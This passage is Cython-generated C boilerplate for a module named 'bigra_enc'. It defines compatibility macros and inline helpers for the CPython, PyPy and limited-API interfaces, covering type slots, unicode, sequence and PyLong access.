  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)
#elif CYTHON_COMPILING_IN_GRAAL
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) _PyFrame_SetLineNumber((frame), (lineno))
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyThreadState_Current PyThreadState_Get()
#elif !CYTHON_FAST_THREAD_STATE
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x030d00A1
  #define __Pyx_PyThreadState_Current PyThreadState_GetUnchecked()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#endif
#if CYTHON_USE_MODULE_STATE
static CYTHON_INLINE void *__Pyx__PyModule_GetState(PyObject *op)
{
    void *result;
    result = PyModule_GetState(op);
    if (!result)
        Py_FatalError("Couldn't find the module state");
    return result;
}
#define __Pyx_PyModule_GetState(o) (__pyx_mstatetype *)__Pyx__PyModule_GetState(o)
#else
#define __Pyx_PyModule_GetState(op) ((void)op,__pyx_mstate_global)
#endif
#define __Pyx_PyObject_GetSlot(obj, name, func_ctype)  __Pyx_PyType_GetSlot(Py_TYPE((PyObject *) obj), name, func_ctype)
#define __Pyx_PyObject_TryGetSlot(obj, name, func_ctype) __Pyx_PyType_TryGetSlot(Py_TYPE(obj), name, func_ctype)
#define __Pyx_PyObject_GetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_GetSubSlot(Py_TYPE(obj), sub, name, func_ctype)
#define __Pyx_PyObject_TryGetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_TryGetSubSlot(Py_TYPE(obj), sub, name, func_ctype)
#if CYTHON_USE_TYPE_SLOTS
  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((type)->name)
  #define __Pyx_PyType_TryGetSlot(type, name, func_ctype) __Pyx_PyType_GetSlot(type, name, func_ctype)
  #define __Pyx_PyType_GetSubSlot(type, sub, name, func_ctype) (((type)->sub) ? ((type)->sub->name) : NULL)
  #define __Pyx_PyType_TryGetSubSlot(type, sub, name, func_ctype) __Pyx_PyType_GetSubSlot(type, sub, name, func_ctype)
#else
  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((func_ctype) PyType_GetSlot((type), Py_##name))
  #define __Pyx_PyType_TryGetSlot(type, name, func_ctype)\
    ((__PYX_LIMITED_VERSION_HEX >= 0x030A0000 ||\
     (PyType_GetFlags(type) & Py_TPFLAGS_HEAPTYPE) || __Pyx_get_runtime_version() >= 0x030A0000) ?\
     __Pyx_PyType_GetSlot(type, name, func_ctype) : NULL)
  #define __Pyx_PyType_GetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_GetSlot(obj, name, func_ctype)
  #define __Pyx_PyType_TryGetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_TryGetSlot(obj, name, func_ctype)
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
#define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStrWithError(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
static CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStr(PyObject *dict, PyObject *name) {
    PyObject *res = __Pyx_PyDict_GetItemStrWithError(dict, name);
    if (res == NULL) PyErr_Clear();
    return res;
}
#elif !CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07020000
#define __Pyx_PyDict_GetItemStrWithError  PyDict_GetItemWithError
#define __Pyx_PyDict_GetItemStr           PyDict_GetItem
#else
static CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStrWithError(PyObject *dict, PyObject *name) {
#if CYTHON_COMPILING_IN_PYPY
    return PyDict_GetItem(dict, name);
#else
    PyDictEntry *ep;
    PyDictObject *mp = (PyDictObject*) dict;
    long hash = ((PyStringObject *) name)->ob_shash;
    assert(hash != -1);
    ep = (mp->ma_lookup)(mp, name, hash);
    if (ep == NULL) {
        return NULL;
    }
    return ep->me_value;
#endif
}
#define __Pyx_PyDict_GetItemStr           PyDict_GetItem
#endif
#if CYTHON_USE_TYPE_SLOTS
  #define __Pyx_PyType_GetFlags(tp)   (((PyTypeObject *)tp)->tp_flags)
  #define __Pyx_PyType_HasFeature(type, feature)  ((__Pyx_PyType_GetFlags(type) & (feature)) != 0)
#else
  #define __Pyx_PyType_GetFlags(tp)   (PyType_GetFlags((PyTypeObject *)tp))
  #define __Pyx_PyType_HasFeature(type, feature)  PyType_HasFeature(type, feature)
#endif
#define __Pyx_PyObject_GetIterNextFunc(iterator)  __Pyx_PyObject_GetSlot(iterator, tp_iternext, iternextfunc)
#if CYTHON_USE_TYPE_SPECS && PY_VERSION_HEX >= 0x03080000
#define __Pyx_PyHeapTypeObject_GC_Del(obj)  {\
    PyTypeObject *type = Py_TYPE((PyObject*)obj);\
    assert(__Pyx_PyType_HasFeature(type, Py_TPFLAGS_HEAPTYPE));\
    PyObject_GC_Del(obj);\
    Py_DECREF(type);\
}
#else
#define __Pyx_PyHeapTypeObject_GC_Del(obj)  PyObject_GC_Del(obj)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_ReadChar(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((void)u, 1114111U)
  #define __Pyx_PyUnicode_KIND(u)         ((void)u, (0))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)u)
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)k, PyUnicode_ReadChar((PyObject*)(d), i))
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GetLength(u))
#else
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         ((int)PyUnicode_KIND(u))
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, (Py_UCS4) ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #if !defined(PyUnicode_DecodeUnicodeEscape)
    #define PyUnicode_DecodeUnicodeEscape(s, size, errors)  PyUnicode_Decode(s, size, "unicode_escape", errors)
  #endif
  #if !defined(PyUnicode_Contains)
    #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
  #endif
  #if !defined(PyByteArray_Check)
    #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
  #endif
  #if !defined(PyObject_Format)
    #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
  #endif
#endif
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if CYTHON_COMPILING_IN_CPYTHON
  #define __Pyx_PySequence_ListKeepNew(obj)\
    (likely(PyList_CheckExact(obj) && Py_REFCNT(obj) == 1) ? __Pyx_NewRef(obj) : PySequence_List(obj))
#else
  #define __Pyx_PySequence_ListKeepNew(obj)  PySequence_List(obj)
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        __Pyx_IS_TYPE(obj, &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API || CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS || !CYTHON_ASSUME_SAFE_MACROS
  #if __PYX_LIMITED_VERSION_HEX >= 0x030d0000
    #define __Pyx_PyList_GetItemRef(o, i) PyList_GetItemRef(o, i)
  #else
    #define __Pyx_PyList_GetItemRef(o, i) PySequence_GetItem(o, i)
  #endif
#else
  #define __Pyx_PyList_GetItemRef(o, i) __Pyx_NewRef(PyList_GET_ITEM(o, i))
#endif
#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000
#define __Pyx_PyDict_GetItemRef(dict, key, result) PyDict_GetItemRef(dict, key, result)
#elif CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS
static CYTHON_INLINE int __Pyx_PyDict_GetItemRef(PyObject *dict, PyObject *key, PyObject **result) {
  *result = PyObject_GetItem(dict, key);
  if (*result == NULL) {
    if (PyErr_ExceptionMatches(PyExc_KeyError)) {
      PyErr_Clear();
      return 0;
    }
    return -1;
  }
  return 1;
}
#else
static CYTHON_INLINE int __Pyx_PyDict_GetItemRef(PyObject *dict, PyObject *key, PyObject **result) {
  *result = PyDict_GetItemWithError(dict, key);
  if (*result == NULL) {
    return PyErr_Occurred() ? -1 : 0;
  }
  Py_INCREF(*result);
  return 1;
}
#endif
#if defined(CYTHON_DEBUG_VISIT_CONST) && CYTHON_DEBUG_VISIT_CONST
  #define __Pyx_VISIT_CONST(obj)  Py_VISIT(obj)
#else
  #define __Pyx_VISIT_CONST(obj)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_ITEM(o, i) PySequence_ITEM(o, i)
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
  #define __Pyx_PyTuple_SET_ITEM(o, i, v) (PyTuple_SET_ITEM(o, i, v), (0))
  #define __Pyx_PyTuple_GET_ITEM(o, i) PyTuple_GET_ITEM(o, i)
  #define __Pyx_PyList_SET_ITEM(o, i, v) (PyList_SET_ITEM(o, i, v), (0))
  #define __Pyx_PyList_GET_ITEM(o, i) PyList_GET_ITEM(o, i)
#else
  #define __Pyx_PySequence_ITEM(o, i) PySequence_GetItem(o, i)
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
  #define __Pyx_PyTuple_SET_ITEM(o, i, v) PyTuple_SetItem(o, i, v)
  #define __Pyx_PyTuple_GET_ITEM(o, i) PyTuple_GetItem(o, i)
  #define __Pyx_PyList_SET_ITEM(o, i, v) PyList_SetItem(o, i, v)
  #define __Pyx_PyList_GET_ITEM(o, i) PyList_GetItem(o, i)
#endif
#if CYTHON_ASSUME_SAFE_SIZE
  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_GET_SIZE(o)
  #define __Pyx_PyList_GET_SIZE(o) PyList_GET_SIZE(o)
  #define __Pyx_PySet_GET_SIZE(o) PySet_GET_SIZE(o)
  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_GET_SIZE(o)
  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_GET_SIZE(o)
  #define __Pyx_PyUnicode_GET_LENGTH(o) PyUnicode_GET_LENGTH(o)
#else
  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_Size(o)
  #define __Pyx_PyList_GET_SIZE(o) PyList_Size(o)
  #define __Pyx_PySet_GET_SIZE(o) PySet_Size(o)
  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_Size(o)
  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_Size(o)
  #define __Pyx_PyUnicode_GET_LENGTH(o) PyUnicode_GetLength(o)
#endif
#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000
  #define __Pyx_PyImport_AddModuleRef(name) PyImport_AddModuleRef(name)
#else
  static CYTHON_INLINE PyObject *__Pyx_PyImport_AddModuleRef(const char *name) {
      PyObject *module = PyImport_AddModule(name);
      Py_XINCREF(module);
      return module;
  }
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_InternFromString)
  #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
#endif
#define __Pyx_PyLong_FromHash_t PyLong_FromSsize_t
#define __Pyx_PyLong_AsHash_t   __Pyx_PyIndex_AsSsize_t
#if __PYX_LIMITED_VERSION_HEX >= 0x030A0000
    #define __Pyx_PySendResult PySendResult
#else
    typedef enum {
        PYGEN_RETURN = 0,
        PYGEN_ERROR = -1,
        PYGEN_NEXT = 1,
    } __Pyx_PySendResult;
#endif
#if CYTHON_COMPILING_IN_LIMITED_API || PY_VERSION_HEX < 0x030A00A3
  typedef __Pyx_PySendResult (*__Pyx_pyiter_sendfunc)(PyObject *iter, PyObject *value, PyObject **result);
#else
  #define __Pyx_pyiter_sendfunc sendfunc
#endif
#if !CYTHON_USE_AM_SEND
#define __PYX_HAS_PY_AM_SEND 0
#elif __PYX_LIMITED_VERSION_HEX >= 0x030A0000
#define __PYX_HAS_PY_AM_SEND 1
#else
#define __PYX_HAS_PY_AM_SEND 2  // our own backported implementation
#endif
#if __PYX_HAS_PY_AM_SEND < 2
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
#else
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
        __Pyx_pyiter_sendfunc am_send;
    } __Pyx_PyAsyncMethodsStruct;
    #define __Pyx_SlotTpAsAsync(s) ((PyAsyncMethods*)(s))
#endif
#if CYTHON_USE_AM_SEND && PY_VERSION_HEX < 0x030A00F0
    #define __Pyx_TPFLAGS_HAVE_AM_SEND (1UL << 21)
#else
    #define __Pyx_TPFLAGS_HAVE_AM_SEND (0)
#endif
#if PY_VERSION_HEX >= 0x03090000
#define __Pyx_PyInterpreterState_Get() PyInterpreterState_Get()
#else
#define __Pyx_PyInterpreterState_Get() PyThreadState_Get()->interp
#endif
#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030A0000
#ifdef __cplusplus
extern "C"
#endif
PyAPI_FUNC(void *) PyMem_Calloc(size_t nelem, size_t elsize);
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
static int __Pyx_init_co_variable(PyObject *inspect, const char* name, int *write_to) {
    int value;
    PyObject *py_value = PyObject_GetAttrString(inspect, name);
    if (!py_value) return 0;
    value = (int) PyLong_AsLong(py_value);
    Py_DECREF(py_value);
    *write_to = value;
    return value != -1 || !PyErr_Occurred();
}
static int __Pyx_init_co_variables(void) {
    PyObject *inspect;
    int result;
    inspect = PyImport_ImportModule("inspect");
    result =
#if !defined(CO_OPTIMIZED)
        __Pyx_init_co_variable(inspect, "CO_OPTIMIZED", &CO_OPTIMIZED) &&
#endif
#if !defined(CO_NEWLOCALS)
        __Pyx_init_co_variable(inspect, "CO_NEWLOCALS", &CO_NEWLOCALS) &&
#endif
#if !defined(CO_VARARGS)
        __Pyx_init_co_variable(inspect, "CO_VARARGS", &CO_VARARGS) &&
#endif
#if !defined(CO_VARKEYWORDS)
        __Pyx_init_co_variable(inspect, "CO_VARKEYWORDS", &CO_VARKEYWORDS) &&
#endif
#if !defined(CO_ASYNC_GENERATOR)
        __Pyx_init_co_variable(inspect, "CO_ASYNC_GENERATOR", &CO_ASYNC_GENERATOR) &&
#endif
#if !defined(CO_GENERATOR)
        __Pyx_init_co_variable(inspect, "CO_GENERATOR", &CO_GENERATOR) &&
#endif
#if !defined(CO_COROUTINE)
        __Pyx_init_co_variable(inspect, "CO_COROUTINE", &CO_COROUTINE) &&
#endif
        1;
    Py_DECREF(inspect);
    return result ? 0 : -1;
}
#else
static int __Pyx_init_co_variables(void) {
    return 0;  // It's a limited API-only feature
}
#endif

/* MathInitCode */
#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #ifndef _USE_MATH_DEFINES
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#ifndef CYTHON_CLINE_IN_TRACEBACK_RUNTIME
#define CYTHON_CLINE_IN_TRACEBACK_RUNTIME 0
#endif
#ifndef CYTHON_CLINE_IN_TRACEBACK
#define CYTHON_CLINE_IN_TRACEBACK CYTHON_CLINE_IN_TRACEBACK_RUNTIME
#endif
#if CYTHON_CLINE_IN_TRACEBACK
#define __PYX_MARK_ERR_POS(f_index, lineno)  { __pyx_filename = __pyx_f[f_index]; (void) __pyx_filename; __pyx_lineno = lineno; (void) __pyx_lineno; __pyx_clineno = __LINE__; (void) __pyx_clineno; }
#else
#define __PYX_MARK_ERR_POS(f_index, lineno)  { __pyx_filename = __pyx_f[f_index]; (void) __pyx_filename; __pyx_lineno = lineno; (void) __pyx_lineno; (void) __pyx_clineno; }
#endif
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifdef CYTHON_EXTERN_C
    #undef __PYX_EXTERN_C
    #define __PYX_EXTERN_C CYTHON_EXTERN_C
#elif defined(__PYX_EXTERN_C)
    #ifdef _MSC_VER
    #pragma message ("Please do not define the '__PYX_EXTERN_C' macro externally. Use 'CYTHON_EXTERN_C' instead.")
    #else
    #warning Please do not define the '__PYX_EXTERN_C' macro externally. Use 'CYTHON_EXTERN_C' instead.
    #endif
#else
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__bigra_enc
#define __PYX_HAVE_API__bigra_enc
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s);
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
static CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char*);
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if CYTHON_ASSUME_SAFE_MACROS
    #define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
    #define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
    #define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
    #define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
    #define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
    #define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
    #define __Pyx_PyByteArray_AsString(s) PyByteArray_AS_STRING(s)
#else
    #define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AsString(s))
    #define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AsString(s))
    #define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AsString(s))
    #define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AsString(s))
    #define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AsString(s))
    #define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AsString(s))
    #define __Pyx_PyByteArray_AsString(s) PyByteArray_AsString(s)
#endif
#define __Pyx_PyObject_AsWritableString(s)    ((char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
#define __Pyx_PyUnicode_FromOrdinal(o)       PyUnicode_FromOrdinal((int)o)
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
static CYTHON_INLINE PyObject *__Pyx_NewRef(PyObject *obj) {
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030a0000 || defined(Py_NewRef)
    return Py_NewRef(obj);
#else
    Py_INCREF(obj);
    return obj;
#endif
}
static CYTHON_INLINE PyObject *__Pyx_XNewRef(PyObject *obj) {
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030a0000 || defined(Py_XNewRef)
    return Py_XNewRef(obj);
#else
    Py_XINCREF(obj);
    return obj;
#endif
}
static CYTHON_INLINE PyObject *__Pyx_Owned_Py_None(int b);
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_Long(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyLong_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __Pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#define __Pyx_PyFloat_AS_DOUBLE(x) PyFloat_AS_DOUBLE(x)
#else
#define __Pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#define __Pyx_PyFloat_AS_DOUBLE(x) PyFloat_AsDouble(x)
#endif
#define __Pyx_PyFloat_AsFloat(x) ((float) __Pyx_PyFloat_AsDouble(x))
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_VERSION_HEX >= 0x030C00A7
  #ifndef _PyLong_SIGN_MASK
    #define _PyLong_SIGN_MASK 3
  #endif
  #ifndef _PyLong_NON_SIZE_BITS
    #define _PyLong_NON_SIZE_BITS 3
  #endif
  #define __Pyx_PyLong_Sign(x)  (((PyLongObject*)x)->long_value.lv_tag & _PyLong_SIGN_MASK)
  #define __Pyx_PyLong_IsNeg(x)  ((__Pyx_PyLong_Sign(x) & 2) != 0)
  #define __Pyx_PyLong_IsNonNeg(x)  (!__Pyx_PyLong_IsNeg(x))
  #define __Pyx_PyLong_IsZero(x)  (__Pyx_PyLong_Sign(x) & 1)
  #define __Pyx_PyLong_IsPos(x)  (__Pyx_PyLong_Sign(x) == 0)
  #define __Pyx_PyLong_CompactValueUnsigned(x)  (__Pyx_PyLong_Digits(x)[0])
  #define __Pyx_PyLong_DigitCount(x)  ((Py_ssize_t) (((PyLongObject*)x)->long_value.lv_tag >> _PyLong_NON_SIZE_BITS))
  #define __Pyx_PyLong_SignedDigitCount(x)\
        ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * __Pyx_PyLong_DigitCount(x))
  #if defined(PyUnstable_Long_IsCompact) && defined(PyUnstable_Long_CompactValue)
    #define __Pyx_PyLong_IsCompact(x)     PyUnstable_Long_IsCompact((PyLongObject*) x)
    #define __Pyx_PyLong_CompactValue(x)  PyUnstable_Long_CompactValue((PyLongObject*) x)
  #else
    #define __Pyx_PyLong_IsCompact(x)     (((PyLongObject*)x)->long_value.lv_tag < (2 << _PyLong_NON_SIZE_BITS))
    #define __Pyx_PyLong_CompactValue(x)  ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * (Py_ssize_t) __Pyx_PyLong_Digits(x)[0])
  #endif
  typedef Py_ssize_t  __Pyx_compact_pylong;
  typedef size_t  __Pyx_compact_upylong;
  #else
  #define __Pyx_PyLong_IsNeg(x)  (Py_SIZE(x) < 0)
  #define __Pyx_PyLong_IsNonNeg(x)  (Py_SIZE(x) >= 0)
  #define __Pyx_PyLong_IsZero(x)  (Py_SIZE(x) == 0)
  #define __Pyx_PyLong_IsPos(x)  (Py_SIZE(x) > 0)
  #define __Pyx_PyLong_CompactValueUnsigned(x)  ((Py_SIZE(x) == 0) ? 0 : __Pyx_PyLong_Digits(x)[0])
  #define __Pyx_PyLong_DigitCount(x)  __Pyx_sst_abs(Py_SIZE(x))
  #define __Pyx_PyLong_SignedDigitCount(x)  Py_SIZE(x)
